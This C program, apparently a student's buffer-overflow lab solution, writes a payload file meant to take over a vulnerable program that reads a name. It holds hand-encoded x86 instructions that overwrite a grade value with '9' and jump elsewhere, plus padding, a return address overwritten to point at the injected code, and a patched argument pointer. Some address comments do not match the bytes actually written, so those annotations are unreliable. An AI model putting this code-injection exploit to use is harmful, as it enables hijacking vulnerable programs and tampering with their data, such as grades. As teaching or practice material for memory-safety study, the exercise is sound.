#include <stdio.h>
#include <stdlib.h>

int main(){

	FILE *data9;
	int i;
	
	if ((data9 = fopen("data9", "w")) == NULL){
		fprintf(stderr, "\nERROR\n");
		exit(1);
	}

	fprintf(data9, "Nikolas");

	fputc('\0', data9);	/* end of name */

	/* movb $9,0x80d4be8 */
	fputc('\xc6', data9);	/*movb*/
	fputc('\x05', data9);	
	fputc('\xe8', data9);	/*grade [0x80d4be8]*/
	fputc('\x46', data9);
	fputc('\x0d', data9);
	fputc('\x08', data9);
	fputc('\x39', data9);	/* '9' */
	
	/*mov addr, %eax*/
	fputc('\xb8', data9);	/*mov*/
	fputc('\x6f', data9);	/*addr [0x8048b6bf]*/
	fputc('\x8b', data9);	
	fputc('\x04', data9);
	fputc('\x08', data9);

	/* jmp %eax */
	fputc('\xff', data9);
	fputc('\xe0', data9);
											/* '8'==56 (buf[56] points to ret address)*/
	for (i=0; i<27; i++) fputc('8',data9); /* fill the remaining bytes for buffer+ebp */

	fputc('\xe8', data9);	/* overwrite ret address with Name address */
	fputc('\x65', data9);	/* to start executing the injected instructions*/
	fputc('\x0d', data9);	/* so, [0x80d65e0] + 8 (to bypass the string Nikolas) = [0x80d65e8]*/
	fputc('\x08', data9);

	fputc('\xe0', data9);	/* address of string Name [0x80d65e0] to rewrite adress of readString argument to not be destroyed*/
	fputc('\x65', data9);	/* due to buf[i] = 0; in readString*/
	fputc('\x0d', data9);
	fputc('\x08', data9);

	fclose(data9);

	return 0;
}